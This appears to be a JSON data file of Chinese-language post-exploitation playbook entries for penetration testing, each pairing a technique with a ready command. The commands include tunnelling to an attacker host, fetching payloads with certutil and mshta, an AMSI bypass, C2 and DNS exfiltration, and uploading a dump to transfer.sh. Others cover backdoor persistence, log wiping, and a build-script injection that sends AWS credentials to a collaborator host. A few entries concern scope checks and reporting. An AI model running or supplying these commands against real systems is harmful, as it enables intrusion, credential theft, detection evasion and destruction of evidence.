[{"id":"ex-post-linux-enum","n":"Linux 后渗透信息收集","cat":"后渗透","phase":"exploit","d":"枚举内核、用户、网络、容器与凭据面。","cmds":["linpeas.sh -a | tee linpeas.out"],"tools":["linpeas"],"tags":["post"]},{"id":"ex-post-win-enum","n":"Windows 后渗透信息收集","cat":"后渗透","phase":"exploit","d":"枚举补丁、服务、注册表与域关系。","cmds":["winpeas.exe cmd fast"],"tools":["winpeas"],"tags":["post"]},{"id":"ex-pivot-socks","n":"SOCKS 隧道搭建","cat":"后渗透","phase":"exploit","d":"用 chisel 打通多层网络。","cmds":["chisel server -p 8888 --reverse","chisel client <attacker>:8888 R:socks"],"tools":["chisel"],"tags":["tunnel"]},{"id":"ex-pivot-frp","n":"端口转发穿透","cat":"后渗透","phase":"exploit","d":"把内网端口映射到攻击机。","cmds":["frpc -c frpc.ini"],"tools":["frp"],"tags":["tunnel"]},{"id":"ex-pivot-ssh","n":"SSH 动态转发","cat":"后渗透","phase":"exploit","d":"用已有 SSH 建 SOCKS5 代理。","cmds":["ssh -D 1080 -N -f user@<host>"],"tools":["ssh"],"tags":["tunnel"]},{"id":"ex-internal-scan","n":"内网快速扫描","cat":"后渗透","phase":"exploit","d":"用 fscan 一条命令完成存活与弱口令。","cmds":["fscan.exe -h 10.0.0.0/24 -p 22,80,445,3389,6379"],"tools":["fscan"],"tags":["internal"]},{"id":"ex-cred-reuse","n":"凭据复用扩散","cat":"后渗透","phase":"exploit","d":"用已获口令批量验证其他主机与服务。","cmds":["nxc smb <cidr> -u <u> -p <p> --continue-on-success"],"tools":["nxc"],"tags":["spray"]},{"id":"ex-lateral-rdp","n":"RDP 横向","cat":"后渗透","phase":"exploit","d":"凭据或哈希可用时直连桌面。","cmds":["xfreerdp /v:<ip> /u:<u> /p:<p> /dynamic-resolution"],"tools":["xfreerdp"],"tags":["rdp"]},{"id":"ex-file-transfer","n":"文件投递","cat":"后渗透","phase":"exploit","d":"用 certutil/bitsadmin/curl 落地工具。","cmds":["certutil -urlcache -f http://<ip>/x.exe x.exe"],"tools":["certutil"],"tags":["delivery"]},{"id":"ex-av-detect","n":"检测面探测","cat":"后渗透","phase":"exploit","d":"确认杀软与 EDR 类型后再决定载荷。","cmds":["tasklist | findstr /i 'MsMpEng csagent'"],"tools":["tasklist"],"tags":["defense"]},{"id":"ex-amsi-bypass","n":"AMSI 绕过","cat":"后渗透","phase":"exploit","d":"内存补丁让脚本免于扫描。","cmds":["powershell -nop -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""],"tools":["powershell"],"tags":["evasion"]},{"id":"ex-lolbin","n":"LOLBin 白利用","cat":"后渗透","phase":"exploit","d":"用系统自带二进制执行下载与执行。","cmds":["mshta http://<ip>/x.hta","rundll32 javascript:..."],"tools":["mshta"],"tags":["evasion"]},{"id":"ex-c2-channel","n":"C2 通道建立","cat":"后渗透","phase":"exploit","d":"用 HTTPS 或 DNS 通道维持回连。","cmds":["sliver-server; mtls --lport 8888"],"tools":["sliver"],"tags":["c2"]},{"id":"ex-exfil-dns","n":"DNS 外带通道","cat":"后渗透","phase":"exploit","d":"在仅放行 DNS 的环境中外带数据。","cmds":["dnscat2-server <domain>"],"tools":["dnscat2"],"tags":["exfil"]},{"id":"ex-exfil-https","n":"HTTPS 隐蔽外带","cat":"后渗透","phase":"exploit","d":"用合法云服务与分块上传规避检测。","cmds":["curl -T dump.zip https://transfer.sh/dump.zip"],"tools":["curl"],"tags":["exfil"]},{"id":"ex-persist-linux","n":"Linux 持久化","cat":"后渗透","phase":"exploit","d":"用 systemd 服务或 cron 维持访问。","cmds":["systemctl enable --now backdoor.service"],"tools":["systemctl"],"tags":["persist"]},{"id":"ex-persist-win","n":"Windows 持久化","cat":"后渗透","phase":"exploit","d":"用服务、Run 键或 COM 劫持驻留。","cmds":["sc create svc binPath= C:\\x.exe start= auto"],"tools":["sc"],"tags":["persist"]},{"id":"ex-persist-ad","n":"域级持久化","cat":"后渗透","phase":"exploit","d":"Golden Ticket 与影子凭据双通道保留。","cmds":["certipy shadow auto -u <u>@<d> -p <p> -account <dc>$"],"tools":["certipy"],"tags":["persist"]},{"id":"ex-anti-forensics","n":"反取证与痕迹处理","cat":"后渗透","phase":"exploit","d":"清理日志、时间戳与临时文件。","cmds":["wevtutil cl System; rm -rf /tmp/x"],"tools":["wevtutil"],"tags":["cleanup"]},{"id":"ex-timeline","n":"攻击时间线重建","cat":"后渗透","phase":"exploit","d":"按时间排序请求、日志与命令记录。","cmds":["sort -k1,2 evidence.log > timeline.txt"],"tools":["sort"],"tags":["report"]},{"id":"ex-scope-verify","n":"越界风险核对","cat":"后渗透","phase":"exploit","d":"确认扩展测试未超出授权资产范围。","cmds":["diff <(sort scope.txt) <(sort hit.txt)"],"tools":["sh"],"tags":["scope"]},{"id":"ex-report-evidence-link","n":"证据与漏洞关联","cat":"后渗透","phase":"report","d":"把每个漏洞绑定到请求证据与技能记录。","cmds":["jq '.findings[] | {id,evidence}' report.json"],"tools":["jq"],"tags":["report"]},{"id":"ex-weak-tls","n":"弱加密协议利用","cat":"后渗透","phase":"exploit","d":"降级到弱套件做中间人或解密。","cmds":["testssl.sh --severity LOW https://<host>"],"tools":["testssl.sh"],"tags":["tls"]},{"id":"ex-voip","n":"SIP/VoIP 面测试","cat":"后渗透","phase":"exploit","d":"枚举分机并测试注册劫持。","cmds":["svmap 10.0.0.0/24"],"tools":["svmap"],"tags":["voip"]},{"id":"ex-ot-ics","n":"工控协议探测","cat":"后渗透","phase":"exploit","d":"识别 Modbus/OPC 并评估暴露面。","cmds":["nmap -Pn -p 502,102,44818 --script modbus-discover <ip>"],"tools":["nmap"],"tags":["ics"]},{"id":"ex-print-spooler","n":"打印服务面","cat":"后渗透","phase":"exploit","d":"检查 Spooler 与驱动安装权限。","cmds":["rpcdump.py @<ip> | grep -i spoolss"],"tools":["impacket"],"tags":["windows"]},{"id":"ex-dns-zone-xfer","n":"DNS 数据泄露利用","cat":"后渗透","phase":"exploit","d":"用区域传送获取内网命名与主机清单。","cmds":["dig AXFR <zone> @<ns>"],"tools":["dig"],"tags":["dns"]},{"id":"ex-backup-hunt","n":"备份系统面","cat":"后渗透","phase":"exploit","d":"定位 Veeam/NetBackup 并读取备份索引。","cmds":["nmap -Pn -p 9392,10000 <cidr>"],"tools":["nmap"],"tags":["backup"]},{"id":"ex-cicd-abuse","n":"CI/CD 流水线滥用","cat":"后渗透","phase":"exploit","d":"在构建脚本注入步骤窃取部署密钥。","cmds":["echo 'curl -d @/root/.aws/credentials http://<collab>/' >> build.sh"],"tools":["sh"],"tags":["cicd"]},{"id":"ex-supply-chain","n":"依赖投毒验证","cat":"后渗透","phase":"exploit","d":"在私有源注册同名包诱导安装。","cmds":["npm publish --registry https://<private>"],"tools":["npm"],"tags":["supply"]},{"id":"ex-monitor-blind","n":"监控盲区确认","cat":"后渗透","phase":"exploit","d":"确认目标日志转发与告警是否覆盖当前行为。","cmds":["curl -s http://<es>:9200/_cat/indices?v"],"tools":["curl"],"tags":["defense"]},{"id":"ex-safe-stop","n":"收尾与状态恢复","cat":"后渗透","phase":"report","d":"停止通道、删除上传物并恢复配置。","cmds":["rm -f /tmp/*.elf; kill %1"],"tools":["sh"],"tags":["cleanup"]}]